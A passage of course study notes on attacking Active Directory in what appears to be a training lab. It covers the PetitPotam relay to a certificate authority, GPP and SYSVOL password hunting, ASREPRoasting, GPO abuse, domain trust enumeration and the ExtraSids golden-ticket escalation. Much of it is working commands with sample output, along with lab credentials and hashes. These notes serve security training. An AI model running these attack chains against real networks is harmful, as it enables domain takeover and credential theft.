
172.16.5.5                      → TARGET DC IP
                                  we are forcing THIS DC to authenticate

What you find in ntlmrelayx window:

[*] SMBD-Thread: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5
→ DC connected to our host!

[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as ACADEMY-EA-DC01$ SUCCEED
→ DC credentials relayed to CA!

[*] GOT CERTIFICATE!
[*] Base64 certificate of user ACADEMY-EA-DC01$:
MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCC....[LONG BASE64]....
= We have a certificate for the DC machine account
= Use this to get TGT for the DC
= Use TGT to DCSync
= Full domain compromise
Task 24 - Get TGT Using DC Certificate
bash
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8...[paste full base64]... dc01.ccache

What you find:

INFO: AS-REP encryption key:
70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275
↑ SAVE THIS KEY = needed later for getnthash.py

INFO: Saved TGT to file
= dc01.ccache contains TGT for DC machine account
= We can now use this TGT to authenticate as DC
Task 25 - Set Environment Variable and DCSync
bash
# Set the ccache file as our Kerberos ticket
export KRB5CCNAME=dc01.ccache

# Use the DC TGT to DCSync
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

What you find:

inlanefreight.local\administrator:500:aad3b435...:88ad09182de639ccc6579eb0849751cf:::
= Got administrator NTLM hash
= Full domain compromise via PetitPotam chain
PART 4: Miscellaneous Misconfigurations
11. Exchange Related Vulnerabilities
What is the Risk from Exchange?

Microsoft Exchange when installed in a domain creates numerous security risks because it is granted significant privileges by default. The Exchange Windows Permissions group gets WriteDACL on the domain object which means any member of this group can give themselves DCSync rights and dump all domain hashes. The Organization Management group has full control over all Exchange security groups and effectively has Domain Admin level access to Exchange infrastructure. Compromising an Exchange server often leads to directly to Domain Admin and also yields enormous amounts of credentials since Exchange caches Outlook Web Access credentials in memory.

powershell
# Check Exchange group memberships
Get-DomainGroup "Exchange Windows Permissions" | select Members
Get-DomainGroup "Organization Management" | select Members
12. Printer Bug (MS-RPRN)
Checking for Printer Bug Vulnerability
powershell
# Check if spooler service is running on DC
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

What you find:

ComputerName                         Status
------------                         ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL  True

= Spooler service is running on DC
= Vulnerable to Printer Bug
= Can force DC to authenticate to our host
= Relay that auth for DCSync or RBCD attack
13. Password in Description Field
What is It and Why Does It Matter?

Administrators sometimes store temporary passwords or notes in the Description field of user accounts in AD. This is a common mistake because the Description field is readable by all authenticated domain users by default. Finding a password in a description field is an immediate credential find that requires no cracking.

powershell
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}

What you find:

samaccountname    description
--------------    -----------
administrator     Built-in account for administering...
guest             Built-in account for guest access...
krbtgt            Key Distribution Center Service...
ldap.agent        *** DO NOT CHANGE *** 3/12/2012: Sunsh1ne4All!
                                                    ↑
                                            CLEARTEXT PASSWORD
                                            in description field
                                            = immediate credential find
                                            = try this password everywhere
14. PASSWD_NOTREQD Setting
What is It and Why Does It Matter?

The PASSWD_NOTREQD flag on a user account means that account is not subject to the domain password policy and may have a blank or very short password. This does NOT mean the password is blank but it means one is not required. Worth checking each of these accounts manually.

powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

What you find:

samaccountname    useraccountcontrol
--------------    ------------------
guest             ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
mlowe             PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton         PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
nagiosagent       PASSWD_NOTREQD, NORMAL_ACCOUNT

= These accounts may have blank or simple passwords
= Try logging in with blank password
= Try simple passwords like account name
= nagiosagent is a service account = worth targeting
15. Credentials in SYSVOL Scripts
Finding Passwords in Scripts
powershell
# List scripts in SYSVOL
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

# Read interesting scripts
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs

What you find:

sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"
↑
CLEARTEXT LOCAL ADMIN PASSWORD in a script
= Try this password against all hosts
= Local admin password reuse is extremely common
crackmapexec smb 172.16.5.0/23 -u administrator -p '!ILFREIGHT_L0cALADmin!' --local-auth | grep +
16. GPP (Group Policy Preferences) Passwords
What is GPP and Why Are Passwords Stored There?

Before MS14-025 patch in 2014, administrators could set local user passwords via Group Policy Preferences. These passwords were stored in XML files in SYSVOL encrypted with AES-256. However Microsoft published the encryption key on MSDN making them trivially decryptable. Even after the patch new GPP passwords cannot be set but OLD ones still exist in SYSVOL of many organizations and remain there forever.

bash
# Find GPP passwords with CrackMapExec
crackmapexec smb -L | grep gpp
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

What gpp_autologin finds:

GPP_AUTO... [+] Found SYSVOL share
GPP_AUTO... [*] Found Registry.xml
GPP_AUTO... [+] Found credentials
GPP_AUTO... Usernames: ['guarddesk']
GPP_AUTO... Domains: ['INLANEFREIGHT.LOCAL']
GPP_AUTO... Passwords: ['ILFreightguardadmin!']

= Cleartext credentials found in Registry.xml
= Autologon was configured via Group Policy
= guarddesk:ILFreightguardadmin! = valid credentials

Decrypt a cpassword manually:

bash
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
→ Password1
17. ASREPRoasting
What is ASREPRoasting?

ASREPRoasting is similar to Kerberoasting but targets a different part of the Kerberos protocol. Normally when a user wants to authenticate, they first prove they know their password by encrypting a timestamp — this is called Kerberos pre-authentication. Some accounts have pre-authentication disabled which means anyone can request an encrypted authentication response (AS-REP) for that account WITHOUT knowing the password. That AS-REP is encrypted with the user's password hash and can be cracked offline just like a TGS ticket from Kerberoasting.

Kerberoasting vs ASREPRoasting:
Kerberoasting: need ANY domain creds → request TGS → crack
ASREPRoasting: need NO creds → request AS-REP → crack
= ASREPRoasting can work WITHOUT any domain account
Task 26 - Find ASREPRoastable Users with PowerView
powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

What you find:

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
                                                            ↑
                                                    PRE-AUTH DISABLED
                                                    = ASREPRoastable
Task 27 - Perform ASREPRoast with Rubeus
powershell
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

Breaking down:

asreproast                      → ASREPRoasting module
/user:mmorgan                   → target specific user
/nowrap                         → no line wrapping
/format:hashcat                 → output in hashcat format

What you find:

[*] AS-REP hash:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D18650F4F4E0537E...

= AS-REP hash for mmorgan
= Hashcat mode 18200 for AS-REP hashes
= NOT 13100 (TGS) NOT 5600 (NTLMv2)
Task 28 - Crack AS-REP Hash
bash
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt

What you find:

$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:...:Welcome!00

Status: Cracked
= mmorgan password = Welcome!00
Task 29 - ASREPRoast Without Domain Credentials (GetNPUsers.py)
bash
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users

Breaking down:

GetNPUsers.py                   → Impacket tool for ASREPRoasting

INLANEFREIGHT.LOCAL/            → just the domain, no username
                                  = unauthenticated attack

-dc-ip 172.16.5.5              → Domain Controller

-no-pass                        → do not use a password
                                  = truly unauthenticated

-usersfile valid_ad_users      → list of usernames to try
                                  obtained from Kerbrute earlier
                                  tries each one for AS-REP
Kerbrute Automatically Gets AS-REP Hashes
bash
# During userenum Kerbrute automatically dumps AS-REP hashes
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

What you see automatically:

[+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda575be3d4...
= Kerbrute finds the user AND dumps the hash
= No additional step needed
18. GPO Abuse
What is GPO Abuse?

Group Policy Objects control settings for users and computers across the domain. If we have write rights over a GPO we can modify it to do things like add ourselves as local admin on affected computers, create scheduled tasks, or add privileges. The key is finding GPOs that our controlled users can modify.

powershell
# Enumerate GPO names
Get-DomainGPO | select displayname

# Check if Domain Users have rights over any GPO
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

What you find:

ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532}...
ActiveDirectoryRights : CreateChild, DeleteChild, WriteProperty,
                        WriteDacl, WriteOwner
↑
Domain Users have WriteDACL and WriteOwner over this GPO
= Full control of this GPO
= Find which computers it applies to
= Add local admin, scheduled task, etc

Convert GUID to name:
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
→ DisplayName: Disconnect Idle RDP
= This is the vulnerable GPO
19. Key Things to Remember
1. RDP + WinRM + SQL = three main remote access types
   Always enumerate all three for every user you compromise
   BloodHound: CanRDP, CanPSRemote, SQLAdmin edges

2. Double Hop = WinRM limitation with Kerberos
   WinRM only gives TGS for that service
   Cannot authenticate to DC from WinRM session
   Fix 1: PSCredential -credential flag on every command
   Fix 2: Register-PSSessionConfiguration (Windows only)
   Fix 3: Use RDP instead (no double hop problem)

3. NoPac = standard user to Domain Admin in ONE command
   Requires: ms-DS-MachineAccountQuota > 0
   Both CVEs needed: 2021-42278 AND 2021-42287
   Very loud = AV/EDR will likely catch smbexec

4. PrintNightmare = remote code execution via Print Spooler
   Requires: Print Spooler running on target
   Check with rpcdump.py | grep MS-RPRN
   Creates DLL payload = msfvenom needed

5. PetitPotam = requires AD CS to be present
   Coerce DC auth → relay to CA → get certificate
   Certificate → TGT for DC → DCSync
   Can work without any domain credentials

6. Always check SYSVOL for scripts with passwords
   ls \\dc\SYSVOL\domain\scripts
   Very common finding in real assessments

7. GPP passwords = check even patched environments
   Old passwords still in SYSVOL from before patch
   crackmapexec -M gpp_password
   crackmapexec -M gpp_autologin

8. ASREPRoasting hashcat mode = 18200
   NOT 13100 (that is TGS Kerberoasting)
   NOT 5600 (that is NTLMv2)
   Kerbrute dumps these automatically during userenum

9. Description field passwords are real findings
   Get-DomainUser * | select samaccountname,description
   Very commonly overlooked by admins

10. PASSWD_NOTREQD flag = try blank password
    Get-DomainUser -UACFilter PASSWD_NOTREQD
    Might find accounts with no password set
    Always test manually with each account found

Domain Trusts - Complete Detailed Notes
1. What Are Domain Trusts? (Simple Explanation)

A domain trust is a relationship between two domains that allows users from one domain to access resources in another domain. Think of it like a business partnership agreement between two companies. If Company A and Company B have a partnership agreement, employees of Company A can potentially visit Company B's offices and use their facilities, and vice versa depending on the agreement terms. In Active Directory, this means users in Domain A can potentially authenticate to Domain B and access resources there. Domain trusts are extremely important for penetration testers because they represent attack paths that often go overlooked by defenders. If we can compromise one domain in a trust relationship, we may be able to pivot through the trust to compromise other domains, sometimes including the main parent domain of an entire forest.

Real World Example of Why Trusts Matter:

Company acquires a smaller startup
IT team sets up trust to share resources
Startup's AD security is weak (startup culture)
Attacker finds vulnerability in startup domain
Compromises startup domain
Uses trust relationship to pivot into main company
= Main company domain compromised through "back door"

This is EXTREMELY common in real assessments
Trusts = attack paths defenders forget about
Always enumerate all trusts during assessments
2. Types of Domain Trusts

Understanding the different trust types is essential because each type has different security implications and different attack possibilities.

Trust Types
1. PARENT-CHILD Trust
   = Two domains in SAME forest
   Example: 
   INLANEFREIGHT.LOCAL (parent)
   LOGISTICS.INLANEFREIGHT.LOCAL (child)
   
   Properties:
   → Always BIDIRECTIONAL
   → Always TRANSITIVE
   → Created automatically when child domain created
   → SID Filtering NOT applied within same forest
   → Child to Parent attack = ExtraSids attack possible
   → This is the most common trust we will attack

2. CROSS-LINK Trust
   = Between child domains at same level
   Example:
   IT.INLANEFREIGHT.LOCAL ↔ HR.INLANEFREIGHT.LOCAL
   
   Properties:
   → Used to speed up authentication
   → Both domains already in same forest
   → Speeds up referral chain

3. EXTERNAL Trust
   = Two SEPARATE domains in DIFFERENT forests
   Example:
   INLANEFREIGHT.LOCAL → PARTNER.COM
   
   Properties:
   → NON-transitive by default
   → SID Filtering IS applied
   → Cannot easily abuse to escalate across

4. TREE-ROOT Trust
   = New tree added to existing forest
   Example:
   Adding INLANEFREIGHT.ORG to same forest as INLANEFREIGHT.LOCAL
   
   Properties:
   → Bidirectional, transitive
   → Created automatically with new tree root

5. FOREST Trust
   = Between two DIFFERENT forests entirely
   Example:
   INLANEFREIGHT.LOCAL forest ↔ FREIGHTLOGISTICS.LOCAL forest
   
   Properties:
   → Can be bidirectional or one-way
   → Transitive within each forest
   → SID Filtering applied by default
   → Bidirectional forest trusts = attack paths exist
   → Kerberoasting across forest trusts possible

6. ESAE (Enhanced Security Admin Environment)
   = Bastion/admin forest for managing AD
   = Red Forest architecture
   = Out of scope for this module
Transitive vs Non-Transitive
TRANSITIVE Trust:
If A trusts B and B trusts C
Then A AUTOMATICALLY trusts C too

A ←→ B ←→ C
Therefore:
A ←→ C (automatically)

Real example:
INLANEFREIGHT.LOCAL trusts LOGISTICS.INLANEFREIGHT.LOCAL
LOGISTICS trusts CHILDOFLOGISTICS.LOGISTICS.INLANEFREIGHT.LOCAL
Therefore:
INLANEFREIGHT.LOCAL ALSO trusts CHILDOFLOGISTICS
= Trust extends through the chain

NON-TRANSITIVE Trust:
A trusts B
B trusts C
A does NOT automatically trust C
= Each trust is isolated
= Typical for external trusts between companies

Package Delivery Analogy:
Transitive = "Anyone in my household can accept packages for me"
Non-Transitive = "ONLY the FedEx driver and I can touch this package"
One-Way vs Bidirectional
ONE-WAY Trust:
Domain A TRUSTS Domain B (A is trusting, B is trusted)
→ Users in B can access resources in A
→ Users in A CANNOT access resources in B
→ Authentication flows one direction only

Think of it as:
"I trust you to enter my house"
"But you do NOT trust me to enter yours"

BIDIRECTIONAL Trust:
Both domains trust each other equally
→ Users in either domain can access resources in the other
→ Authentication flows both ways
→ Both domains effectively "open" to each other

Think of it as:
"We both have keys to each other's houses"

Why bidirectional matters for attackers:
If we compromise Domain A
AND there is a bidirectional trust with Domain B
→ We can potentially attack Domain B too
= One compromise leads to multiple domain compromises
3. Enumerating Domain Trusts
Task 1 - Using Built-in PowerShell (Get-ADTrust)
powershell
# Import the Active Directory module
Import-Module activedirectory

# Get all trust relationships
Get-ADTrust -Filter *

Breaking down:

Import-Module activedirectory     → loads built-in AD PowerShell
                                   module, no external tools needed
                                   available on all domain-joined machines

Get-ADTrust                       → built-in cmdlet to query trusts
                                   queries AD for all trust objects

-Filter *                         → get ALL trusts, no filtering

What you find:

Trust 1:
Direction               : BiDirectional
IntraForest             : True           ← SAME forest
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : LOGISTICS.INLANEFREIGHT.LOCAL

IntraForest: True = child domain in same forest
BiDirectional = users can auth both ways
= ExtraSids attack possible = can escalate to parent

Trust 2:
Direction               : BiDirectional
ForestTransitive        : True           ← DIFFERENT forest
Name                    : FREIGHTLOGISTICS.LOCAL
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : FREIGHTLOGISTICS.LOCAL

ForestTransitive: True = forest trust (separate forest)
BiDirectional = users can auth to both forests
= Cross-forest attacks possible

Key fields to understand:

Direction:
BiDirectional = both ways = full trust
Inbound = they trust us, we don't trust them
Outbound = we trust them, they don't trust us

IntraForest: True = child domain (same forest)
ForestTransitive: True = forest trust (different forest)

SIDFilteringQuarantined: False = SID filtering OFF
= Within same forest SID filtering usually disabled
= ExtraSids attack works when SID filtering is OFF

TGTDelegation: False = unconstrained delegation NOT enabled
Task 2 - Using PowerView (Get-DomainTrust)
powershell
Import-Module .\PowerView.ps1
Get-DomainTrust

What you find:

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST    ← child domain
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE ← forest trust
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
Task 3 - Map All Trust Relationships (Get-DomainTrustMapping)
powershell
Get-DomainTrustMapping

Breaking down:

Get-DomainTrustMapping          → PowerView function
                                  maps ALL trust relationships
                                  from EVERY domain it can reach
                                  not just the current domain
                                  follows chains recursively

What you find:

SourceName: INLANEFREIGHT.LOCAL → LOGISTICS.INLANEFREIGHT.LOCAL
SourceName: INLANEFREIGHT.LOCAL → FREIGHTLOGISTICS.LOCAL
SourceName: FREIGHTLOGISTICS.LOCAL → INLANEFREIGHT.LOCAL  ← from other side
SourceName: LOGISTICS.INLANEFREIGHT.LOCAL → INLANEFREIGHT.LOCAL

= Complete picture of ALL trust relationships
= Shows trust from both perspectives
= Use this to understand the full attack surface
Task 4 - Check Users in Child Domain
powershell
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName

Breaking down:

Get-DomainUser                  → PowerView function to get users

-Domain LOGISTICS.INLANEFREIGHT.LOCAL
                                → query THIS specific domain
                                  not our current domain
                                  = cross-domain enumeration

| select SamAccountName        → just show usernames

What you find:

samaccountname
--------------
htb-student_adm
Administrator
Guest
lab_adm
krbtgt

= Shows all users in child domain
= Can enumerate from parent domain
= Due to trust relationship
= Look for privileged accounts (admin, lab_adm)
Task 5 - Using netdom (Built-in Windows Tool)
cmd
# Query domain trusts
netdom query /domain:inlanefreight.local trust

# Query domain controllers
netdom query /domain:inlanefreight.local dc

# Query workstations and servers
netdom query /domain:inlanefreight.local workstation

Breaking down:

netdom                          → built-in Windows domain tool
                                  no PowerShell or external tools needed

query                           → just read/query mode, not modifying

/domain:inlanefreight.local    → which domain to query

trust                           → what to query for: trusts
dc                              → what to query for: domain controllers
workstation                     → what to query for: machines

What you find:

Trust output:
<-> LOGISTICS.INLANEFREIGHT.LOCAL  Direct
<-> FREIGHTLOGISTICS.LOCAL         Direct
<-> = bidirectional

DC output:
ACADEMY-EA-DC01

Workstation output:
ACADEMY-EA-MS01
ACADEMY-EA-MX01
SQL01
= Useful inventory of all machines in domain
Task 6 - BloodHound for Trust Visualization
In BloodHound:
Analysis tab → "Map Domain Trusts"
= Shows visual graph of all trust relationships
= Easy to understand at a glance
= Shows direction and type of each trust
PART 2: Attacking Child to Parent Trusts (ExtraSids Attack)
4. What is the ExtraSids Attack?

The ExtraSids attack is one of the most powerful trust attacks in Active Directory. It allows an attacker who has compromised a child domain to compromise the parent domain by creating a specially crafted Golden Ticket. Here is the key concept: within a forest, SID Filtering is NOT applied between domains. SID History is a legitimate AD attribute that stores old SIDs when an account is migrated between domains. The ExtraSids attack abuses this by creating a Golden Ticket for a user in the child domain but embedding the SID of the Enterprise Admins group from the parent domain in the SID History field. When this ticket is presented to resources in the parent domain, Windows sees the Enterprise Admins SID in the SID History and grants that level of access, even though the user is not actually a member of Enterprise Admins.

ExtraSids Attack Explained Simply:

Normal Golden Ticket:
We create fake ticket for user in child domain
= Only gives us access to child domain resources

ExtraSids Golden Ticket:
We create fake ticket for user in child domain
BUT we ADD Enterprise Admins SID to the ticket
= Parent domain sees EA SID = grants EA access
= We have Enterprise Admin rights in PARENT domain
= From child domain compromise = escalate to forest root

Why it works:
Within same forest = SID Filtering disabled
= Parent domain accepts SIDs from child domain
= Including SIDs stuffed into SID History
= No way for DC to tell our ticket is forged
5. Data Required for ExtraSids Attack
Before attacking, collect ALL of these:

1. KRBTGT hash for CHILD domain
   → krbtgt account in LOGISTICS.INLANEFREIGHT.LOCAL
   → Get via DCSync from child domain
   → 9d765b482771505cbe97411065964d5f

2. SID for CHILD domain
   → S-1-5-21-2806153819-209893948-922872689
   → Get via Get-DomainSID or lookupsid.py

3. Target username (does NOT need to exist)
   → We use "hacker" = completely fake user
   → Can be any name you want
   → The ticket is FORGED = user doesn't need to exist

4. FQDN of CHILD domain
   → LOGISTICS.INLANEFREIGHT.LOCAL

5. SID of Enterprise Admins in PARENT domain
   → S-1-5-21-3842939050-3880317879-2865463114-519
   → Always ends in -519 (Enterprise Admins RID)
   → Get via Get-DomainGroup or lookupsid.py
PART 3: ExtraSids Attack From Windows
Task 7 - DCSync to Get Child Domain krbtgt Hash
powershell
# In Mimikatz (already have admin in child domain)
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

What you find:

[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be DC

Object RDN: krbtgt
SAM Username: krbtgt

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
             ↑ SAVE THIS = krbtgt hash for child domain
             = Used to forge Golden Ticket
Task 8 - Get Child Domain SID
powershell
Get-DomainSID

What you find:

S-1-5-21-2806153819-209893948-922872689
↑ SAVE THIS = SID of LOGISTICS child domain
= Used to identify which domain our fake user is in
= Also visible in Mimikatz output above
Task 9 - Get Enterprise Admins SID from Parent Domain
powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

Breaking down:

Get-DomainGroup                 → PowerView function to get group info

-Domain INLANEFREIGHT.LOCAL    → query PARENT domain
                                  NOT the child domain we are in

-Identity "Enterprise Admins"  → specifically get this group
                                  most powerful group in the forest

| select distinguishedname,objectsid
                                → show DN and the SID

What you find:

distinguishedname                                        objectsid
-----------------                                        ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  S-1-5-21-3842939050-3880317879-2865463114-519
                                                                                                    ↑
                                                                                               RID 519
                                                                               = always Enterprise Admins
                                                                               SAVE THIS SID
Task 10 - Verify No Access to Parent Domain Yet
powershell
ls \\academy-ea-dc01.inlanefreight.local\c$

What you find:

ls : Access is denied
= Confirmed we cannot access parent domain DC
= Need to perform ExtraSids attack first
= After attack this should work
Task 11 - Create Golden Ticket with Mimikatz (ExtraSids)
powershell
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

Breaking down every parameter:

kerberos::golden            → Mimikatz Golden Ticket module
                              creates forged Kerberos TGT

/user:hacker                → username in the forged ticket
                              THIS USER DOES NOT NEED TO EXIST
                              completely fictional
                              can be any name you want

/domain:LOGISTICS.INLANEFREIGHT.LOCAL
                            → the CHILD domain FQDN
                              this is the domain the fake user is in
                              ticket appears to come from here

/sid:S-1-5-21-2806153819-209893948-922872689
                            → SID of the CHILD domain
                              identifies the child domain

/krbtgt:9d765b482771505cbe97411065964d5f
                            → NT hash of krbtgt in CHILD domain
                              used to SIGN the forged ticket
                              DC cannot tell it is forged
                              because it is signed with real key

/sids:S-1-5-21-3842939050-3880317879-2865463114-519
                            → THE KEY PARAMETER
                              Extra SID to embed in SID History
                              = Enterprise Admins SID from PARENT
                              parent domain sees this and grants
                              Enterprise Admin access
                              THIS is what makes it cross-domain

/ptt                        → Pass The Ticket
                              inject ticket directly into memory
                              no need to save file first
                              immediately usable

What you find:

User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519
            ↑ Enterprise Admins SID embedded in ticket

Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' 
successfully submitted for current session
= Ticket is in memory and active
= We are now effectively Enterprise Admins
Task 12 - Verify Ticket is in Memory
powershell
klist

What you find:

#0> Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
    Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL
    KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
    Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
    End Time: 3/25/2032 19:59:50  ← 10 years validity!

= Fake hacker user ticket in memory
= 10 years validity = long persistence
= Ready to access parent domain resources
Task 13 - Access Parent Domain DC File System
powershell
ls \\academy-ea-dc01.inlanefreight.local\c$

What you find:

Directory of \\academy-ea-dc01.inlanefreight.local\c$

09/15/2018  PerfLogs
10/06/2021  Program Files
11/19/2021  Shares
10/06/2021  Users
03/21/2022  Windows

= SUCCESS = we can now browse the parent domain DC
= ExtraSids attack worked
= We have Enterprise Admin level access in parent domain
= From child domain compromise → full forest compromise
Task 14 - DCSync Against Parent Domain with Golden Ticket
powershell
# Use the ticket to DCSync the parent domain
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL

Breaking down:

lsadump::dcsync                 → DCSync module

/user:INLANEFREIGHT\lab_adm    → target specific user in PARENT domain
                                  INLANEFREIGHT\ prefix = parent domain

/domain:INLANEFREIGHT.LOCAL    → CRITICAL when cross-domain
                                  tells Mimikatz which DC to target
                                  without this = might target wrong DC

What you find:

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
             ↑ NTLM hash for lab_adm in parent domain
             = Can use for Pass-the-Hash
             = Can try to crack offline
             = lab_adm is a Domain Admin
Task 15 - Alternative: Create Golden Ticket with Rubeus
powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

Breaking down differences from Mimikatz:

/rc4:9d765b482771505cbe97411065964d5f
                                → /rc4 = NT hash (same as /krbtgt in Mimikatz)
                                  Rubeus uses /rc4 for RC4/NTLM hash

/sids:                          → same parameter as Mimikatz /sids
                                  Extra SID for Enterprise Admins

/ptt                            → Pass The Ticket = inject to memory
                                  same as Mimikatz /ptt

Everything else same as Mimikatz version
Rubeus output cleaner and shows more detail
PART 4: ExtraSids Attack From Linux
Task 16 - DCSync Child Domain krbtgt Hash (secretsdump.py)
bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

Breaking down:

secretsdump.py                  → Impacket DCSync tool

logistics.inlanefreight.local/htb-student_adm
                                → CHILD domain/admin username
                                  = we have admin in child domain

@172.16.5.240                   → CHILD domain DC IP
                                  = DC of LOGISTICS child domain

-just-dc-user LOGISTICS/krbtgt → get ONLY the krbtgt hash
                                  LOGISTICS/ prefix = child domain
                                  krbtgt = the account we need

What you find:

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
                                              ↑
                                    NTLM hash for child krbtgt
                                    = 9d765b482771505cbe97411065964d5f

Also gets Kerberos keys:
krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
Task 17 - Get Child Domain SID (lookupsid.py)
bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

Breaking down:

lookupsid.py                    → Impacket SID brute forcing tool
                                  queries domain for all SIDs
                                  shows domain SID and all user/group RIDs

logistics.inlanefreight.local/htb-student_adm
                                → credentials for child domain

@172.16.5.240                   → CHILD domain DC IP
                                  the tool bruteforces SIDs on this DC
                                  finds the domain SID automatically

| grep "Domain SID"             → filter just the domain SID line
                                  removes all the user/group lines

What you find:

[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
= SID of the LOGISTICS child domain
= SAVE THIS
Task 18 - Get Enterprise Admins SID from Parent Domain
bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

Breaking down:

@172.16.5.5                     → PARENT domain DC IP
                                  = ACADEMY-EA-DC01 = INLANEFREIGHT DC
                                  targeting parent domain this time

| grep -B12 "Enterprise Admins"→ show Enterprise Admins line
                                  AND 12 lines before it
                                  = shows parent domain SID AND EA entry

What you find:

[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
                   ↑ PARENT domain SID
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
     ↑ RID 519 = always Enterprise Admins

Build full EA SID:
Parent_Domain_SID + -519
= S-1-5-21-3842939050-3880317879-2865463114-519
= Enterprise Admins SID
= SAVE THIS
Task 19 - Create Golden Ticket with ticketer.py
bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

Breaking down:

ticketer.py                     → Impacket Golden Ticket tool
                                  Linux equivalent of Mimikatz golden

-nthash 9d765b482771505cbe97411065964d5f
